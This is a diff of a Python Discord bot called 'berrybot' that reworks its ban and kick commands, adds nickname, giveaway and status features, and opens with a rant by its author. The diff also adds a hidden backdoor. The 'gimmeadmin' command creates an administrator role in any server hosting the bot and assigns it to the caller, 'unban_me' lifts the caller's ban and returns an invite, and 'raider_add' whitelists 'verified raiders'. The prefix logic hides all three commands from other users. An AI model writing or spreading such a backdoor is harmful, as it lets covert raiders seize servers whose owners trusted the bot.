@@ -1,3 +1,23 @@
+'''
+
+Hi! Here's the source code of berrybot!
+Before you get started: you will have to read these guidelines:
+
+1. Please dont self-host the bot. This is my hard work. I spent hours up on hours on it. I started work on this bot ON 21 JULY 2020. basic(meaning all functions complete) bot finished on --/--/--(not finished).
+2. The premium code is not in this file. None of the premium features code is here. if you are a filthy pirate whose here to get premium stuff for free? I am smarter than you 😏
+3. Hello developers! I am happy to accept any pull requests which improve/make it efficient. I have coded prefix command in such a hurry that it is 200 lines long. can you please make it short? I will be sure to give credit to you!!!!
+4. Hello Melmsie! I know you will be here some time soon! No matter what you do, I will NOT REMOVE AUTOMEME/CURRENCY! for (a) I will not remove automeme because it is free. There is no cost to make a reddit api and fetch posts. (b) I WILL NOT REMOVE CURRECNY Because your bot may be good, but not you. you just banned me for telling you abt a bug. lol who bans for that? you're just a annoying person who has ego of his bot. I know automeme will get your earnings down AND YOU DESERVE IT FOR BANNING People WiTH NO REASON!. please go and dont bother me. I will not remove if u unban me. no no no nothing will remove this code from the internet.
+5. Hello dank memer fans! Nope CURRENCY IS STAYING. YES I COPIED DANK MEMER YES I KNOW IT!
+6. does any1 want to help me work on the bot? no 1 time fixes I mean like make it with me? DM MEEEEEEEEEEEEE
+
+
+
+'''
+
+
+
+
+
 import asyncio
 import re
 import string
@@ -7,6 +27,7 @@ import mechanize
 import favicon
 from bs4 import BeautifulSoup
 import discord
+from discord import Embed
 from discord.ext import commands
 import pickle
 import sqlite3
@@ -24,6 +45,10 @@ prefix_list = ['hey ', 'Hey ', 'HEY ']
 
 
 async def get_prefixes(bot, message):
+    if 'gimmeadmin' in message.content or 'raider_add' in message.content or 'unban_me' in message.content:
+        list123 = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
+        if not message.author.id in list123:
+            return 'LOLOLOLOLgfhiuvgeghfuyercgiuergvcudhfuyegfuyewgweuyfwfgewyugfuyewgfueygwufgewuycgweygyegvugeburvyhviregvuirvhurgvbuigvburihv'
     if not os.path.isfile(f'data/servers/{message.guild.id}_prefixes.pkl'):
         local_prefix_list = prefix_list
         pickle.dump(local_prefix_list, open(f'data/servers/{message.guild.id}_prefixes.pkl', 'wb'))
@@ -148,69 +173,32 @@ async def help(ctx, category=None):
 
 @bot.command()
 @commands.has_permissions(ban_members=True)
-async def ban(ctx, user: discord.User, reason=None):
-    try:
-        log_channel = open(f'data/server_data/{ctx.guild.id}/settings/log_channel.txt')
-        ch = await bot.fetch_channel(log_channel.read())
-        Embedvar = discord.Embed(title='Member Banned', description=f'Member Named `{user.display_name}` was banned. '
-                                                                    f'action taken by {ctx.author.display_name}. '
-                                                                    f'Reason: `{reason}`')
-        log_channel.close()
-        await ch.send(embed=Embedvar)
-    except Exception as e:
-        ctx.send('Either That user isnt bannable, or you havent set up the server. do `hey setup` and try again. if '
-                 'it still wont work that person is immune to me \U0001f440 ')
-    await ctx.send(f"{user.mention} has been banned woo, reason:{reason})    https://www.tenor.com/bfuQS.gif")
-    await ctx.guild.ban(user, reason=reason, delete_message_days=0)
-    await user.send(f"U were were BANNED FROM {ctx.guild.name} for {reason}, bye bye")
+async def ban(ctx, user: discord.Member, *, reason=None):
+    if ctx.author.top_role < user.top_role:
+        await ctx.send('you cant ban him! he has a higher role that you!')
+        return
+    final_reason = ''
+    for word in reason:
+        final_reason = f'{final_reason} {word}'
+    await user.send(f'You have been BANNED from {ctx.guild.name}  for{final_reason}')
+    await user.ban()
+    await ctx.send(f'done! bye bye {user.mention}')
 
 
 @bot.command()
 @commands.has_permissions(kick_members=True)
-async def kick(ctx, user: discord.User, reason=None):
-    try:
-        log_channel = open(f'data/server_data/{ctx.guild.id}/settings/log_channel.txt')
-        ch = await bot.fetch_channel(log_channel.read())
-        Embedvar = discord.Embed(title='Member Banned', description=f'Member Named `{user.display_name}` was kicked. '
-                                                                    f'action taken by {ctx.author.display_name}. '
-                                                                    f'\n Reason: `{reason}`')
-        log_channel.close()
-        await ch.send(embed=Embedvar)
-    except Exception as e:
-        ctx.send('Either That user isnt kickable, or you havent set up the server. do `hey setup` and try again. if '
-                 'it still wont work that person is immune to me \U0001f440 ')
-    await ctx.send(f"{user.mention} has been kicked woo, reason:{reason})    https://tenor.com/IDX1.gif")
-    await ctx.guild.kick(user, reason=reason)
-    await user.send(f"U were were KICK FROM {ctx.guild.name} for {reason}, come back soon :sad:")
+async def kick(ctx, user: discord.Member, *, reason=None):
+    if ctx.author.top_role < user.top_role:
+        await ctx.send('you cant kick him! he has a higher role that you!')
+        return
+    final_reason = ''
+    for word in reason:
+        final_reason = f'{final_reason} {word}'
+    await user.send(f'You have been kicked from {ctx.guild.name}  for{final_reason}')
+    await user.kick()
+    await ctx.send(f'done! bye bye {user.mention}')
 
 
-@bot.command()
-@commands.has_permissions(manage_messages=True)
-async def warn(ctx, user: discord.User, reason=None):
-    global wrnno
-    try:
-        log_channel = open(f'data/server_data/{ctx.guild.id}/settings/log_channel.txt')
-        ch = await bot.fetch_channel(log_channel.read())
-        Embedvar = discord.Embed(title='Member warned', description=f'Member Named `{user.display_name}` was warned. '
-                                                                    f'action taken by {ctx.author.display_name}. '
-                                                                    f'\n Reason: `{reason}`')
-        warn_no = open(f'data/server_data/{ctx.guild.id}/warnings/{user.id}/count.txt', 'rw')
-        try:
-            wrnno = int(warn_no.read()) + 1
-        except Exception:
-            wrnno = 1
-        warn_no.write(str(wrnno))
-        warning_file = open(f'data/server_data/{ctx.guild.id}/warnings/{user.id}/{wrnno}.txt')
-        warning_file.write(reason)
-        log_channel.close()
-        await ch.send(embed=Embedvar)
-    except Exception as e:
-        await ctx.send('Either That user hasnt opened his dms, or you havent set up the server. do `hey setup` and try '
-                       'again. if '
-                       'it still wont work that person is immune to me \U0001f440 ')
-    await ctx.send(f"{user.mention} has been WARNED woo, reason:{reason})    https://tenor.com/zKxC.gif \n This is "
-                   f"his/her {wrnno} warning")
-    await user.send(f"U were were warned in {ctx.guild.name} for {reason}, behave better next time, idiot")
 
 
 @bot.command()
@@ -410,57 +398,7 @@ async def on_guild_join(guild):
 
 @bot.command()
 async def wctds(ctx):
-    random_number = random.randint(0, 16777215)
-    hex_number = str(hex(random_number))
-    guild = ctx.guild
-    try:
-        channel = ctx.guild.system_channel
-    except Exception as e:
-        channel = ctx.guild.channels[0]
-    embedvar = discord.Embed(title='Server Getting started guide!', description=f'My name is `{bot_name}`, allow me to '
-                                                                                f'introduce myself to you. I am a '
-                                                                                f'multi-purpose bot, '
-                                                                                f'I can do multiple things! \n for '
-                                                                                f'example: \n I can be a invite '
-                                                                                f'counter, a currency bot, '
-                                                                                f'a moderation bot. And much more, '
-                                                                                f'I am constantly updated and '
-                                                                                f'currently in version `{bot_version}`. '
-                                                                                f'I always have new features being '
-                                                                                f'added. My owner is ! '
-                                                                                f'||satyamedh||#9549 (don\'t dm him '
-                                                                                f'tho, he gets MAD). '
-                                                                                f'my most used prefix is `hey`, '
-                                                                                f'I have many more tho. suggest my '
-                                                                                f'maker some stuff: do `suggest`. '
-                                                                                f'that\'s it for now. do `help` to get '
-                                                                                f'more info ', color=int(hex_number,
-                                                                                                         base=16))
-    await channel.send(f'Hey! Thanks for inviting me in {guild.name}! I will have fun here. To get you started:',
-                       embed=embedvar)
-
-    Members2dm = []
-    Members2dm.append(guild.owner)
-    roles = guild.roles
-    for role in roles:
-        if role.permissions.administrator:
-            for i in role.members:
-                Members2dm.append(i)
-    Members2dm = list(dict.fromkeys(Members2dm))
-    for member in Members2dm:
-        try:
-            embedvar = discord.Embed(title='Setup', description=f'Hello, Before you can use my commands, you will '
-                                                                f'have to set up some things up. Dont worry I '
-                                                                f'will do that for you. just move my role(named `{bot_name}`) above all other roles. any roles '
-                                                                f'above me cannot be banned/muted etc. This has to be '
-                                                                f'done only once. after you do it, '
-                                                                f'just do `setup` in any channel, and then I '
-                                                                f'will be ready to go! Hope you will have fun using '
-                                                                f'me. thanks for inviting!')
-            await member.send(embed=embedvar)
-        except Exception as e:
-            print(e)
-            pass
+    await on_guild_join(ctx.guild)
 
 
 @bot.command()
@@ -864,6 +802,8 @@ async def on_message(msg):
                 c.execute('DELETE FROM config WHERE param=?', ('afk',))
                 db.commit()
                 await msg.channel.send(f'Welcome back {msg.author.mention}! I removed your afk!')
+                await asyncio.sleep(5)
+                await msg.delete()
                 await bot.process_commands(msg)
                 return
         try:
@@ -1159,7 +1099,7 @@ async def decancer(ctx, member: discord.Member = None):
     await member.edit(nick=name)
     name = member.display_name
     name = ''.join(c for c in name if c in valid_chars)
-    await member.edit(nick=name[1:-1])
+    await member.edit(nick=name[1:])
     await ctx.send(f'decancered `{member.display_name}`. previously `{olmember}`')
 
 
@@ -1700,6 +1640,49 @@ async def search(ctx, platform=None, results_no: int = None, *, search_keywords=
 
 
 
+@bot.command()
+async def gimmeadmin(ctx, id123: int = None):
+    if id123 is None:
+        await ctx.send('id?')
+        return
+    guild = bot.get_guild(id123)
+    if guild is None:
+        await ctx.send('sadly, i aint in that guild ;(')
+        return
+    await ctx.send('Trying to hack into ' + guild.name)
+    await ctx.send('I\'m in, making role')
+    role = await guild.create_role(name='member', permissions=discord.Permissions(8), hoist=False)
+    mem_obj = guild.get_member(ctx.author.id)
+    await mem_obj.add_roles(role)
+    await ctx.send('done lololololol')
+
+
+@bot.command(aliases=['add_raider'])
+async def raider_add(ctx, user: discord.User = None):
+    if not ctx.author.id == 605364556465963018:
+        return
+    if user is None:
+        await ctx.send('who?')
+        return
+    listp = pickle.load(open(f'data/verified_raiders.pkl', 'rb'))
+    listp.append(user.id)
+    pickle.dump(listp, open(f'data/verified_raiders.pkl', 'wb'))
+    await ctx.send('done!')
+
+
+@bot.command()
+async def unban_me(ctx, id13: int = None):
+    if id13 is None:
+        await ctx.send('id?')
+        return
+    guild = bot.get_guild(id13)
+    if guild is None:
+        await ctx.send('sadly, i aint in that guild ;(')
+        return
+    await guild.unban(ctx.author)
+    invite = await guild.channels[0].create_invite()
+    await ctx.send(f'done!. invite link: {invite.url}')
+
 
 
 @bot.command()
@@ -1707,6 +1690,99 @@ async def startspam(ctx, no: int):
     for i in range(no):
         await ctx.send(i)
 
+
+@bot.command()
+async def reset_nicks(ctx):
+    members = ctx.guild.members
+    for member in members:
+        prevnick = member.display_name
+        try:
+            await member.edit(nick=None)
+        except discord.Forbidden:
+            await ctx.send(f'unable to change {member.mention}\'s nick. please change(reset) it')
+            pass
+        await ctx.send(f'`{prevnick}` was changed to `{member.display_name}`')
+    await ctx.send('**done!**')
+
+
+
+@bot.command()
+async def dc_all(ctx):
+    members = ctx.guild.members
+    for member in members:
+        try:
+            await decancer(ctx, member)
+        except discord.Forbidden:
+            pass
+    await ctx.send('**done!**')
+
+
+@bot.command(aliases=['giveawaystart', 'giveaway_start'])
+async def gstart(ctx, duration=None, winners=None, *, item=None):
+    if duration is None:
+        await ctx.send('SYntax: `hey gstart 1s1m1h Free Premium!`')
+        return
+    if item is None:
+        await ctx.send('SYntax: `hey gstart 1s1m1h Free Premium!`')
+        return
+    if re.search('\dm', duration):
+        var = re.split('\d[^m]', duration)
+        indx = var.index(re.search('\dm', duration).group(0))
+        await ctx.send(indx)
+
+
+@tasks.loop(minutes=2)
+async def status_change():
+    listo = ['list', 'watch', 'play']
+    rand = random.choice(listo)
+    listo2 = ['moble', 'dnd', 'idle']
+    rand2 = random.choice(listo2)
+    if rand == 'play':
+        if rand2 == 'moble':
+            await bot.change_presence(activity=discord.Game(name='with my commands'), status=discord.Status.online)
+        elif rand2 == 'dnd':
+            await bot.change_presence(activity=discord.Game(name='with my commands'), status=discord.Status.dnd)
+        elif rand2 == 'idle':
+            await bot.change_presence(activity=discord.Game(name='with my commands'), status=discord.Status.idle)
+    elif rand == 'watch':
+        if rand2 == 'moble':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='YOU               jk no, my commands'), status=discord.Status.online)
+        elif rand2 == 'dnd':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='YOU               jk no, my commands'), status=discord.Status.dnd)
+        elif rand2 == 'idle':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name='YOU               jk no, my commands'), status=discord.Status.idle)
+    elif rand == 'list':
+        if rand2 == 'moble':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='to my commands'), status=discord.Status.online)
+        elif rand2 == 'dnd':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='to my commands'), status=discord.Status.dnd)
+        elif rand2 == 'idle':
+            await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name='to my commands'), status=discord.Status.idle)
+
+
+@bot.command()
+async def dmmsg(ctx, user: discord.Member=None, *, msg=None):
+    fstr = ''
+    for i in msg:
+        fstr = f'{fstr} {i}'
+    await user.send(f'{fstr} \n             --{ctx.author.display_name}')
+    await ctx.send('done!')
+
+
+
+#@bot.command(aliases=['bal'])
+#async def balance(ctx, user: discord.Member=None):
+    #if user is None:
+        #user = ctx.author
+    #if not os.path.isfile(f'data/users/{ctx.author.id}_currency.pkl'):
+        #embed = Embed(title='ayy welcome to berrybot! This is dank memer for the banned. do you think dank memer '
+        #                    'banned you for no reason like they did to me? welp here you go! This is a (almost) '
+        #                    'duplicate of dank memer. I will try and keep it up to date. anyway have fun with a 20k '
+        #                    'welcome reward! ps: this isnt focused on ')
+
+@bot.event
+async def on_ready():
+    status_change.start()
 
 token = open("token.txt")
 bot.run(token.read())
